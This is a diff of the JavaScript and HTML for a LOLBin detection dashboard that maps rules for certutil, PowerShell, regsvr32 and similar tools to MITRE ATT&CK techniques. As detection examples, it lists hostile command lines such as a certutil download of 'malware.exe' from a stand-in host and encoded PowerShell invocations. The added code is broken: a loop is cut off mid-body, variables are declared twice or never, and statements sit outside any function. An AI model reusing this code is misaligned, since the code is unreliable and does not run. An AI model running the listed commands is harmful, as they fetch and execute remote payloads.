@@ -1072,14 +1072,17 @@
                             <div class="row mb-3">
                                 <div class="col-12">
                                     <p class="text-white-50 mb-1">MITRE ATT&CK Techniques</p>
-                                    <div class="d-flex flex-wrap gap-2 mb-3">
-                                        <span class="badge bg-secondary p-2">T1105 - Ingress Tool Transfer</span>
-                                        <span class="badge bg-secondary p-2">T1140 - Deobfuscate/Decode Files or Information</span>
+                                    <div id="ruleMitreTechniques" class="d-flex flex-wrap gap-2 mb-3">
+                                        <!-- This will be populated dynamically -->
                                     </div>
                                     <p class="text-white-50 mb-1">Tactics</p>
-                                    <div class="d-flex flex-wrap gap-2">
-                                        <span class="badge bg-secondary p-2">Command and Control</span>
-                                        <span class="badge bg-secondary p-2">Defense Evasion</span>
+                                    <div id="ruleMitreTactics" class="d-flex flex-wrap gap-2">
+                                        <!-- This will be populated dynamically -->
+                                    </div>
+                                    <div id="ruleMitigationContainer" class="mt-3">
+                                        <a id="ruleMitigationLink" href="#" target="_blank" class="btn btn-outline-primary">
+                                            <i class="fas fa-shield-alt me-1"></i> View Mitigation Procedures
+                                        </a>
                                     </div>
                                 </div>
                             </div>
@@ -1205,79 +1208,192 @@
                     document.getElementById('editRulePattern').value = '(urlcache|-urlcache|-f|-split|-encode|-decode)';
             }
         }
-        
-        // Function to handle viewing rule details
         function viewRuleDetails(ruleName) {
             currentRule = ruleName;
             document.getElementById('ruleDetailModalLabel').textContent = `Rule Details: ${ruleName}`;
+            
+            // Update basic rule information
             document.getElementById('detailRuleName').textContent = ruleName;
             
-            // Show appropriate data based on rule name
-            switch(ruleName) {
-                case 'PowerShell Encoded Command':
-                    document.getElementById('detailLolbin').textContent = 'powershell.exe';
-                    document.getElementById('detailDescription').textContent = 'PowerShell executing encoded commands';
-                    document.getElementById('detailPattern').textContent = '(-e|-enc|-encodedcommand)';
-                    document.getElementById('detailDetectionCount').textContent = '42 alerts triggered';
-                    
-                    // Update examples
-                    const psExamples = document.getElementById('detailExamples');
-                    psExamples.innerHTML = `
-                        <li class="list-group-item bg-dark border-secondary">powershell.exe -encodedcommand JABjA...</li>
-                        <li class="list-group-item bg-dark border-secondary">powershell.exe -enc YwBhAGwA...</li>
-                        <li class="list-group-item bg-dark border-secondary">powershell.exe -e SQBFAFg...</li>
-                    `;
-                    
-                    // Update whitelist
-                    const psWhitelist = document.getElementById('detailWhitelist');
-                    psWhitelist.innerHTML = `<li class="list-group-item bg-dark border-secondary">No whitelist patterns defined</li>`;
-                    
-                    // Update whitelist examples
-                    const psWhitelistExamples = document.getElementById('detailWhitelistExamples');
-                    psWhitelistExamples.innerHTML = `<li class="list-group-item bg-dark border-secondary">No examples available</li>`;
-                    
-                    // Update context
-                    document.getElementById('detailContextEnabled').innerHTML = `<span class="badge bg-success">Context awareness enabled</span>`;
-                    document.getElementById('detailContextProcesses').innerHTML = `
-                        <span class="badge bg-info m-1">cmd.exe</span>
-                        <span class="badge bg-info m-1">wscript.exe</span>
-                    `;
-                    break;
-                // Add other cases as needed
-                default:
-                    // Default to CertUtil Download for demo
-                    document.getElementById('detailLolbin').textContent = 'certutil.exe';
-                    document.getElementById('detailDescription').textContent = 'CertUtil used to download files from internet';
-                    document.getElementById('detailPattern').textContent = '(urlcache|-urlcache|-f|-split|-encode|-decode)';
-                    document.getElementById('detailDetectionCount').textContent = '23 alerts triggered';
-                    
-                    // Reset to default examples
-                    const certExamples = document.getElementById('detailExamples');
-                    certExamples.innerHTML = `
-                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -f http://example.com/malware.exe C:\\temp\\file.exe</li>
-                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -split -f http://example.com/malware.exe</li>
-                        <li class="list-group-item bg-dark border-secondary">certutil.exe -decode encodedfile.txt output.exe</li>
-                    `;
-                    
-                    // Reset whitelist
-                    const certWhitelist = document.getElementById('detailWhitelist');
-                    certWhitelist.innerHTML = `
-                        <li class="list-group-item bg-dark border-secondary">\\.microsoft\\.com</li>
-                        <li class="list-group-item bg-dark border-secondary">\\.windows\\.com</li>
-                        <li class="list-group-item bg-dark border-secondary">\\.windowsupdate\\.com</li>
-                        <li class="list-group-item bg-dark border-secondary">certificate\\.crt$</li>
-                    `;
-                    
-                    // Reset whitelist examples
-                    const certWhitelistExamples = document.getElementById('detailWhitelistExamples');
-                    certWhitelistExamples.innerHTML = `
-                        <li class="list-group-item bg-dark border-secondary">certutil.exe -urlcache -f https://www.microsoft.com/download.exe</li>
-                        <li class="list-group-item bg-dark border-secondary">certutil.exe -decode certificate.crt</li>
-                    `;
-                    
-                    // Reset context
-                    document.getElementById('detailContextEnabled').innerHTML = `<span class="badge bg-secondary">No context awareness enabled</span>`;
-                    document.getElementById('detailContextProcesses').innerHTML = `<span class="badge bg-secondary">None</span>`;
+            // Set rule-specific details based on rule name
+            let lolbin = '';
+            let severity = '';
+            let severityClass = '';
+            let description = '';
+            let pattern = '';
+            let examples = [];
+            let whitelist = [];
+            let whitelistExamples = [];
+            
+            if (ruleName === "PowerShell Encoded Command") {
+                lolbin = 'powershell.exe';
+                severity = '4';
+                severityClass = 'severity-4';
+                description = 'PowerShell executing encoded commands';
+                pattern = '(-e|-enc|-encodedcommand)';
+                examples = [
+                    'powershell.exe -enc YQBsAGUAcgB0ACgAIgBIAGUAbABsAG8AIgApAA==',
+                    'powershell.exe -e YQBsAGUAcgB0ACgAIgBIAGUAbABsAG8AIgApAA==',
+                    'powershell.exe -encodedcommand YQBsAGUAcgB0ACgAIgBIAGUAbABsAG8AIgApAA=='
+                ];
+                whitelist = ['\\\\windows\\\\system32'];
+                whitelistExamples = ['powershell.exe -enc \\windows\\system32\\config'];
+            } else if (ruleName === "CertUtil Download") {
+                lolbin = 'certutil.exe';
+                severity = '4';
+                severityClass = 'severity-4';
+                description = 'CertUtil used to download files from internet';
+                pattern = '(urlcache|-urlcache|-f|-split|-encode|-decode)';
+                examples = [
+                    'certutil.exe -urlcache -f http://example.com/malware.exe C:\\temp\\file.exe',
+                    'certutil.exe -urlcache -split -f http://example.com/malware.exe',
+                    'certutil.exe -decode encodedfile.txt output.exe'
+                ];
+                whitelist = ['\\.microsoft\\.com', '\\.windows\\.com', '\\.windowsupdate\\.com', 'certificate\\.crt$'];
+                whitelistExamples = [
+                    'certutil.exe -urlcache -f https://www.microsoft.com/download.exe',
+                    'certutil.exe -decode certificate.crt'
+                ];
+            }
+            
+            // Update DOM elements with rule details
+            document.getElementById('detailLolbin').textContent = lolbin;
+            document.getElementById('detailDescription').textContent = description;
+            document.getElementById('detailPattern').textContent = pattern;
+            document.getElementById('detailSeverity').innerHTML = `<span class="severity-badge ${severityClass}">${severity}</span> ${getSeverityText(severity)}`;
+            
+            // Update examples
+            const examplesEl = document.getElementById('detailExamples');
+            examplesEl.innerHTML = '';
+            examples.forEach(example => {
+                const li = document.createElement('li');
+                li.className = 'list-group-item bg-dark border-secondary';
+                li.textContent = example;
+                examplesEl.appendChild(li);
+            });
+            
+            // Update whitelist
+            const whitelistEl = document.getElementById('detailWhitelist');
+            whitelistEl.innerHTML = '';
+            whitelist.forEach(item => {
+                const li = document.createElement('li');
+                li.className = 'list-group-item bg-dark border-secondary';
+                li.textContent = item;
+                whitelistEl.appendChild(li);
+            });
+            
+            // Update whitelist examples
+            const whitelistExamplesEl = document.getElementById('detailWhitelistExamples');
+            whitelistExamplesEl.innerHTML = '';
+            whitelistExamples.forEach(example => {
+                const li = document.createElement('li');
+                li.className = 'list-group-item bg-dark border-secondary';
+                li.textContent = example;
+                whitelistExamplesEl.appendChild(li);
+                // Ensure the link opens in a new tab
+                mitigationLink.onclick = function(e) {
+                    window.open(mitigationUrl, '_blank');
+                    e.preventDefault();
+                };
+            } else {
+                mitigationLink.style.display = 'none';
+            }
+        }
+        
+        // Helper function to get severity text
+        function getSeverityText(severity) {
+            switch(severity) {
+                case '1': return 'Low';
+                case '2': return 'Medium-Low';
+                case '3': return 'Medium';
+                case '4': return 'Medium-High';
+                case '5': return 'High';
+                default: return 'Unknown';
+            }
+        }
+            const tacticsDiv = document.getElementById('ruleMitreTactics');
+            const mitigationLink = document.getElementById('ruleMitigationLink');
+            const tacticsDiv = document.getElementById('ruleMitreTactics');
+            const mitigationLink = document.getElementById('ruleMitigationLink');
+            
+            // Clear previous content
+            techniquesDiv.innerHTML = '';
+            tacticsDiv.innerHTML = '';
+            
+            // Set the appropriate values based on rule name
+            let techniqueId = '';
+            let techniqueName = '';
+            let tactic = '';
+            let mitigationUrl = '#';
+            
+            if (ruleName === "PowerShell Encoded Command") {
+                techniqueId = 'T1059.001';
+                techniqueName = 'Command and Scripting Interpreter: PowerShell';
+                tactic = 'Execution';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1059/001/mitigations/';
+            } else if (ruleName === "CertUtil Download") {
+                techniqueId = 'T1105';
+                techniqueName = 'Ingress Tool Transfer';
+                tactic = 'Command and Control';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1105/mitigations/';
+            } else if (ruleName === "Regsvr32 AppLocker Bypass") {
+                techniqueId = 'T1218.010';
+                techniqueName = 'System Binary Proxy Execution: Regsvr32';
+                tactic = 'Defense Evasion';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1218/010/mitigations/';
+            } else if (ruleName === "MSHTA Suspicious Execution") {
+                techniqueId = 'T1218.005';
+                techniqueName = 'System Binary Proxy Execution: MSHTA';
+                tactic = 'Defense Evasion';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1218/005/mitigations/';
+            } else if (ruleName === "WMIC Process Creation") {
+                techniqueId = 'T1047';
+                techniqueName = 'Windows Management Instrumentation';
+                tactic = 'Execution';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1047/mitigations/';
+            } else if (ruleName === "BITSAdmin File Transfer") {
+                techniqueId = 'T1197';
+                techniqueName = 'BITS Jobs';
+                tactic = 'Defense Evasion, Persistence';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1197/mitigations/';
+            } else if (ruleName === "MSBuild Inline Task") {
+                techniqueId = 'T1127';
+                techniqueName = 'Trusted Developer Utilities Proxy Execution';
+                tactic = 'Defense Evasion';
+                mitigationUrl = 'https://attack.mitre.org/techniques/T1127/mitigations/';
+            }
+            
+            // Update the techniques div
+            if (techniqueId && techniqueName) {
+                techniquesDiv.innerHTML = `
+                    <span class="badge bg-secondary p-2">${techniqueId} - ${techniqueName}</span>
+                `;
+            } else {
+                techniquesDiv.innerHTML = '<span class="text-muted">No MITRE technique information available</span>';
+            }
+            
+            // Update the tactics div
+            if (tactic) {
+                tacticsDiv.innerHTML = `
+                    <span class="badge bg-secondary p-2">${tactic}</span>
+                `;
+            } else {
+                tacticsDiv.innerHTML = '<span class="text-muted">No MITRE tactic information available</span>';
+            }
+            
+            // Update the mitigation link
+            if (mitigationUrl !== '#') {
+                mitigationLink.setAttribute('href', mitigationUrl);
+                mitigationLink.setAttribute('target', '_blank');
+                mitigationLink.style.display = 'inline-block';
+                
+                // Ensure the link opens in a new tab
+                mitigationLink.onclick = function(e) {
+                    window.open(mitigationUrl, '_blank');
+                    e.preventDefault();
+                };
+            } else {
+                mitigationLink.style.display = 'none';
             }
         }
         
